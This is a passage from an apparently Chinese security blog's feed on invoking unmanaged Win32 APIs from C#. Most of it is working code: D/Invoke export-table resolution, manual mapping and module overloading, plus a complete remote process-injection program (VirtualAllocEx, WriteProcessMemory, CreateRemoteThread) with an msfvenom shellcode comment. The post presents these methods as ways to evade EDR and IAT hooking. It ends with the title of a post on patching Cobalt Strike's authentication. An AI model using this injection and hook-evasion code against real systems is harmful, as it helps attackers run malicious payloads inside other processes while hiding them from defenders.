PEB 中查找指定函数名称的地址</span></span><br><span class="line">            Console.WriteLine(<span class="string">"[?] Manually map a fresh copy of a DLL (\"kernel32.dll\"), and resolve a function by walking the export table in-memory..."</span>);</span><br><span class="line">            Console.WriteLine(<span class="string">"[+] Search by name --&gt; OpenProcess"</span>);</span><br><span class="line">            Data.PE.PE_MANUAL_MAP moduleDetails = ManualMap.Map.MapModuleToMemory(<span class="string">"C:\\Windows\\System32\\kernel32.dll"</span>);</span><br><span class="line">            Console.WriteLine(<span class="string">"[&gt;] Module Base : "</span> + <span class="keyword">string</span>.Format(<span class="string">"&#123;0:X&#125;"</span>, moduleDetails.ModuleBase.ToInt64()) + <span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//Call OpenProcess</span></span><br><span class="line">            hProc = (IntPtr)DynamicInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, <span class="string">"OpenProcess"</span>, <span class="keyword">typeof</span>(DynamicInvoke.Win32.Delegates.OpenProcess), paramaters);</span><br><span class="line">            Console.WriteLine(<span class="string">"[&gt;] Process Handle : "</span> + <span class="keyword">string</span>.Format(<span class="string">"&#123;0:X&#125;"</span>, hProc.ToInt64()) + <span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Pause execution</span></span><br><span class="line">            Console.WriteLine(<span class="string">"[*] Pausing execution.."</span>);</span><br><span class="line">            Console.ReadLine();</span><br><span class="line"></span><br><span class="line">            <span class="comment"><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span>/</span></span><br><span class="line">            <span class="comment">// 使用模块重载映射 kernel32.dll</span></span><br><span class="line">            <span class="comment">// 在 PEB 中查找指定函数名称的地址</span></span><br><span class="line">            Console.WriteLine(<span class="string">"[?] Use Module Overloading to map a fresh copy of a DLL (\"kernel32.dll\") into memory backed by another file on disk. Resolve a function by walking the export table in-memory..."</span>);</span><br><span class="line">            Console.WriteLine(<span class="string">"[+] Search by name --&gt; OpenProcess"</span>);</span><br><span class="line">            moduleDetails = ManualMap.Overload.OverloadModule(<span class="string">"C:\\Windows\\System32\\kernel32.dll"</span>);</span><br><span class="line">            Console.WriteLine(<span class="string">"[&gt;] Module Base : "</span> + <span class="keyword">string</span>.Format(<span class="string">"&#123;0:X&#125;"</span>, moduleDetails.ModuleBase.ToInt64()) + <span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//Call OpenProcess</span></span><br><span class="line">            hProc = (IntPtr)DynamicInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, <span class="string">"OpenProcess"</span>, <span class="keyword">typeof</span>(DynamicInvoke.Win32.Delegates.OpenProcess), paramaters);</span><br><span class="line">            Console.WriteLine(<span class="string">"[&gt;] Process Handle : "</span> + <span class="keyword">string</span>.Format(<span class="string">"&#123;0:X&#125;"</span>, hProc.ToInt64()) + <span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Pause execution</span></span><br><span class="line">            Console.WriteLine(<span class="string">"[*] Pausing execution.."</span>);</span><br><span class="line">            Console.ReadLine();</span><br><span class="line"></span><br><span class="line">            <span class="comment"><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span>/</span></span><br><span class="line">            Console.WriteLine(<span class="string">"[!] Test complete!"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Pause execution</span></span><br><span class="line">            Console.WriteLine(<span class="string">"[*] Pausing execution.."</span>);</span><br><span class="line">            Console.ReadLine();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了更好的说明实验结果，我们使用 <code>API Monitor v2</code> 比作 EDR，并钩住 <code>kernel32.dll!OpenProcess</code>，然后通过 API Monitor 运行该示例程序。接下来仔细观察那些用 <code>PROCESS_ALL_ACCESS</code> Flag 的调用，然后根据基址进行校对。结果如下图所示：</p><p><img src="/image/【知识回顾】关于 CSharp 中调用非托管代码的方法/blog_2020-11-25_21-43-12.png" alt=""></p><p>结果很明显，P/Invoke 的方式可以成功捕获，但使用 D/Invoke、手动映射和模块重载映射时，未成功捕获。</p><h4 id="4-2、手动构造"><a href="#4-2、手动构造" class="headerlink" title="4.2、手动构造"></a>4.2、手动构造</h4><p>为了更好的理解动态调用，我们可以尝试手动进行构造，这里我们使用 <a href="https://rcoil.me/2019/09/%E3%80%90%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE%E3%80%91%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86/">【知识回顾】进程注入-第一部分</a> 中的代码注入代码，<strong><em>由 <code>P/Invoke</code> 的方式转由 <code>D/Invoke</code> 调用</em></strong>。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">DELEGATES</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">UnmanagedFunctionPointer(CallingConvention.StdCall)</span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">delegate</span> IntPtr <span class="title">OpenProcess</span>(<span class="params"><span class="keyword">uint</span> dwDesiredAccess, <span class="keyword">bool</span> bInheritHandle, <span class="keyword">uint</span> dwProcessId</span>)</span>;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">UnmanagedFunctionPointer(CallingConvention.StdCall)</span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">delegate</span> IntPtr <span class="title">VirtualAllocEx</span>(<span class="params">IntPtr hProcess, IntPtr lpAddress, <span class="keyword">uint</span> dwSize, <span class="keyword">uint</span> flAllocationType, <span class="keyword">uint</span> flProtect</span>)</span>;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">UnmanagedFunctionPointer(CallingConvention.StdCall)</span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">delegate</span> Boolean <span class="title">WriteProcessMemory</span>(<span class="params">IntPtr hProcess, IntPtr lpBaseAddress, <span class="keyword">byte</span>[] lpBuffer, <span class="keyword">uint</span> nSize, <span class="keyword">out</span> UIntPtr lpNumberOfBytesWritten</span>)</span>;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">UnmanagedFunctionPointer(CallingConvention.StdCall)</span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">delegate</span> IntPtr <span class="title">CreateRemoteThread</span>(<span class="params">IntPtr hProcess, IntPtr lpThreadAttributes, <span class="keyword">uint</span> dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, <span class="keyword">uint</span> dwCreationFlags, <span class="keyword">ref</span> <span class="keyword">uint</span> lpThreadId</span>)</span>;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">UnmanagedFunctionPointer(CallingConvention.StdCall)</span>]</span><br><span class="line">    <span class="function"><span class="keyword">delegate</span> Boolean <span class="title">CloseHandle</span>(<span class="params">IntPtr hObject</span>)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键实现类 <code>DemoDInvoke</code>：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">DemoDInvoke</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> 遍历当前进程所加载的模块，获取指定模块的基址。</span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> 这个基址可以传递给 GetProcAddress/LdrGetProcedureAddress，也可以用于手动导出解析</span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> 该函数使用 .NET 的 System.Diagnostics.Process类</span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;author&gt;</span>Ruben Boonen (@FuzzySec)<span class="doctag">&lt;/author&gt;</span></span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name="DLLName"&gt;</span>指定的 DLL 名称 (e.g. "ntdll.dll").<span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;returns&gt;</span> 返回 IntPtr 形式的 DLL 基址，如果没有找到模块，则返回 IntPtr.Zero<span class="doctag">&lt;/returns&gt;</span></span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> IntPtr <span class="title">GetLoadedModuleAddress</span>(<span class="params"><span class="keyword">string</span> DLLName</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        ProcessModuleCollection ProcModules = Process.GetCurrentProcess().Modules;</span><br><span class="line">        <span class="keyword">foreach</span> (ProcessModule Mod <span class="keyword">in</span> ProcModules)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (Mod.FileName.ToLower().EndsWith(DLLName.ToLower()))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> Mod.BaseAddress;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> IntPtr.Zero;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> 从当前进程加载的 DLL 中获取函数指针</span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;author&gt;</span>Ruben Boonen (@FuzzySec)<span class="doctag">&lt;/author&gt;</span></span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name="DLLName"&gt;</span>指定的 DLL 名称 (e.g. "ntdll.dll").<span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name="FunctionName"&gt;</span>导出函数名.<span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;returns&gt;</span>返回 IntPtr 形式的函数指针<span class="doctag">&lt;/returns&gt;</span></span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> IntPtr <span class="title">GetLibraryAddress</span>(<span class="params"><span class="keyword">string</span> DLLName, <span class="keyword">string</span> FunctionName</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        IntPtr hModule = GetLoadedModuleAddress(DLLName);</span><br><span class="line">        <span class="keyword">if</span> (hModule == IntPtr.Zero &amp;&amp; CanLoadFromDisk)</span><br><span class="line">        &#123;</span><br><span class="line">            hModule = LoadModuleFromDisk(DLLName);</span><br><span class="line">            <span class="keyword">if</span> (hModule == IntPtr.Zero)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FileNotFoundException(DLLName + <span class="string">", unable to find the specified file."</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (hModule == IntPtr.Zero)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> DllNotFoundException(DLLName + <span class="string">", Dll was not found."</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> GetExportAddress(hModule, FunctionName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> 给定一个模块基址，通过手动遍历模块导出表来解析函数的地址。</span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;author&gt;</span>Ruben Boonen (@FuzzySec)<span class="doctag">&lt;/author&gt;</span></span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name="ModuleBase"&gt;</span>指向当前进程中模块加载基址的指针<span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name="ExportName"&gt;</span>要搜索的导出函数名 (e.g. "NtAlertResumeThread").<span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;returns&gt;</span>返回 IntPtr 形式的函数指针.<span class="doctag">&lt;/returns&gt;</span></span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> IntPtr <span class="title">GetExportAddress</span>(<span class="params">IntPtr ModuleBase, <span class="keyword">string</span> ExportName</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        IntPtr FunctionPtr = IntPtr.Zero;</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 遍历内存中的 PE 标头</span></span><br><span class="line">            Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + <span class="number">0x3C</span>));</span><br><span class="line">            Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + <span class="number">0x14</span>));</span><br><span class="line">            Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + <span class="number">0x18</span>;</span><br><span class="line">            Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);</span><br><span class="line">            Int64 pExport = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (Magic == <span class="number">0x010b</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                pExport = OptHeader + <span class="number">0x60</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                pExport = OptHeader + <span class="number">0x70</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 读取 -&gt; IMAGE_EXPORT_DIRECTORY</span></span><br><span class="line">            Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);</span><br><span class="line">            Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + <span class="number">0x10</span>));</span><br><span class="line">            Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + <span class="number">0x14</span>));</span><br><span class="line">            Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + <span class="number">0x18</span>));</span><br><span class="line">            Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + <span class="number">0x1C</span>));</span><br><span class="line">            Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + <span class="number">0x20</span>));</span><br><span class="line">            Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + <span class="number">0x24</span>));</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 遍历（Loop the array of export name RVA's）</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NumberOfNames; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">string</span> FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * <span class="number">4</span>))));</span><br><span class="line">                <span class="keyword">if</span> (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase))</span><br><span class="line">                &#123;</span><br><span class="line">                    Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * <span class="number">2</span>)) + OrdinalBase;</span><br><span class="line">                    Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (<span class="number">4</span> * (FunctionOrdinal - OrdinalBase))));</span><br><span class="line">                    FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// Catch parser failure</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidOperationException(<span class="string">"Failed to parse module exports."</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (FunctionPtr == IntPtr.Zero)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// Export not found</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> MissingMethodException(ExportName + <span class="string">", export not found."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> FunctionPtr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主类：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="keyword">string</span>[] args</span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            <span class="comment">// msfvenom -p windows/x64/exec CMD=calc exitfunc=thread -b "\x00" -f csharp</span></span><br><span class="line">            <span class="keyword">byte</span>[] shellcode = &#123; <span class="number">0x31</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x37</span> &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span> pid = Convert.ToInt32(args[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">            IntPtr pointer = DemoDInvoke.GetLibraryAddress(<span class="string">"kernel32.dll"</span>, <span class="string">"OpenProcess"</span>);</span><br><span class="line">            DELEGATES.OpenProcess OpenProcess = Marshal.GetDelegateForFunctionPointer(pointer, <span class="keyword">typeof</span>(DELEGATES.OpenProcess)) <span class="keyword">as</span> DELEGATES.OpenProcess;</span><br><span class="line">            IntPtr pHandle = OpenProcess((<span class="keyword">uint</span>)STRUCTS.ProcessAccessRights.All, <span class="literal">false</span>, (<span class="keyword">uint</span>)pid);</span><br><span class="line"></span><br><span class="line">            pointer = DemoDInvoke.GetLibraryAddress(<span class="string">"kernel32.dll"</span>, <span class="string">"VirtualAllocEx"</span>);</span><br><span class="line">            DELEGATES.VirtualAllocEx VirtualAllocEx = Marshal.GetDelegateForFunctionPointer(pointer, <span class="keyword">typeof</span>(DELEGATES.VirtualAllocEx)) <span class="keyword">as</span> DELEGATES.VirtualAllocEx;</span><br><span class="line">            IntPtr rMemAddress = VirtualAllocEx(pHandle, IntPtr.Zero, (<span class="keyword">uint</span>)shellcode.Length, (<span class="keyword">uint</span>)STRUCTS.MemAllocation.MEM_RESERVE | (<span class="keyword">uint</span>)STRUCTS.MemAllocation.MEM_COMMIT, (<span class="keyword">uint</span>)STRUCTS.MemProtect.PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">            pointer = DemoDInvoke.GetLibraryAddress(<span class="string">"kernel32.dll"</span>, <span class="string">"WriteProcessMemory"</span>);</span><br><span class="line">            DELEGATES.WriteProcessMemory writeProcessMemory = Marshal.GetDelegateForFunctionPointer(pointer, <span class="keyword">typeof</span>(DELEGATES.WriteProcessMemory)) <span class="keyword">as</span> DELEGATES.WriteProcessMemory;</span><br><span class="line">            <span class="keyword">if</span> (writeProcessMemory(pHandle, rMemAddress, shellcode, (<span class="keyword">uint</span>)shellcode.Length, <span class="keyword">out</span> UIntPtr bytesWritten))</span><br><span class="line">            &#123;</span><br><span class="line"></span><br><span class="line">                pointer = DemoDInvoke.GetLibraryAddress(<span class="string">"kernel32.dll"</span>, <span class="string">"CreateRemoteThread"</span>);</span><br><span class="line">                DELEGATES.CreateRemoteThread CreateRemoteThread = Marshal.GetDelegateForFunctionPointer(pointer, <span class="keyword">typeof</span>(DELEGATES.CreateRemoteThread)) <span class="keyword">as</span> DELEGATES.CreateRemoteThread;</span><br><span class="line">                IntPtr hRemoteThread = CreateRemoteThread(pHandle, IntPtr.Zero, <span class="number">0</span>, rMemAddress, IntPtr.Zero, <span class="number">0</span>, <span class="keyword">out</span> UIntPtr lpThreadId);</span><br><span class="line"></span><br><span class="line">                pointer = DemoDInvoke.GetLibraryAddress(<span class="string">"kernel32.dll"</span>, <span class="string">"CloseHandle"</span>);</span><br><span class="line">                DELEGATES.CloseHandle CloseHandle = Marshal.GetDelegateForFunctionPointer(pointer, <span class="keyword">typeof</span>(DELEGATES.CloseHandle)) <span class="keyword">as</span> DELEGATES.CloseHandle;</span><br><span class="line">                CloseHandle(hRemoteThread);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>最后补上一些 <code>STRUCTS</code>，代码就完整了。</p><p>编译代码后，同上使用 <code>API Monitor v2</code> 比做 EDR，并且钩完所涉及的 API，它们分别是：</p><ul><li>kernel32.dll!OpenProcess</li><li>kernel32.dll!VirtualAllocEx</li><li>kernel32.dll!WriteProcessMemory</li><li>kernel32.dll!CreateRemoteThread</li><li>kernel32.dll!CloseHandle</li></ul><p>效果如下：</p><p><img src="/image/【知识回顾】关于 CSharp 中调用非托管代码的方法/blog_2020-11-28_17-15-59.png" alt=""></p><p>完全没有被钩住。这就完全绕过了 <strong><em>IAT hooking</em></strong>。这里仅是绕过了 <strong><em>IAT hooking</em></strong>，在实战中，还需要处理 shellcode。</p><p>查看导出表情况：</p><p><img src="/image/【知识回顾】关于 CSharp 中调用非托管代码的方法/blog_2020-11-26_10-53-17.png" alt=""></p><p>后续随着 DInvoke 的完善，直接应用该库即可。这样无需自己定义函数，省时省力。</p><h3 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h3><ul><li>[1] <a href="https://www.cnblogs.com/wubiyu/archive/2008/09/09/1287618.html" target="_blank" rel="noopener">【Marshal.GetDelegateForFunctionPointer】</a></li><li>[2] <a href="https://posts.specterops.io/offensive-p-invoke-leveraging-the-win32-api-from-managed-code-7eef4fdef16d" target="_blank" rel="noopener">【Offensive P/Invoke: Leveraging the Win32 API from Managed Code】</a></li><li>[3] <a href="https://blog.nviso.eu/2020/11/20/dynamic-invocation-in-net-to-bypass-hooks/" target="_blank" rel="noopener">【Dynamic Invocation in .NET to bypass hooks】</a></li><li>[4] <a href="https://xz.aliyun.com/t/5397" target="_blank" rel="noopener">【手游外挂基础篇之inline-hook】</a></li><li>[5] <a href="https://thewover.github.io/Dynamic-Invoke/" target="_blank" rel="noopener">【Emulating Covert Operations - Dynamic Invocation (Avoiding PInvoke &amp; API Hooks)】</a></li><li>[6] <a href="https://rastamouse.me/blog/process-injection-dinvoke/" target="_blank" rel="noopener">【Process Injection using DInvoke】</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文并非从专业开发的角度去阐述托管/非托管的概念及托管代码如何调用非托管代码，而是从日常的工具编写中及使用中遇到的一些问题，带着解决问题的态度出发，去看待这么一个过程。&lt;/p&gt;
&lt;p&gt;整个过程并非专业解析，而只是助于我们理解罢了。&lt;/p&gt;
    
    </summary>
    
      <category term="编程之道" scheme="https://rcoil.me/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="Tools" scheme="https://rcoil.me/tags/Tools/"/>
    
      <category term="知识回顾" scheme="https://rcoil.me/tags/%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE/"/>
    
  </entry>
  
  <entry>
    <title>【知识回顾】Cobalt Strike 4.0 认证及修补过程</title>
    <link href="https://rcoil.me/2020/11/%E3%80%90%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE%E3%80%91Cobalt%20Strike%204.0%E8%AE%A4%E8%AF%81%E5%8F%8A%E4%BF%AE%E8%A1%A5%E8%BF%87%E7%A8%8B/"/>
    <id>https://rcoil.me/2020/11/【知识回顾】Cobalt Strike 4.0认证及修补过程/</id>
    <published>2020-11-26T11:40:19.000Z</published>
    <updated>2020-12-01T13:53:34.610Z</updated>
    
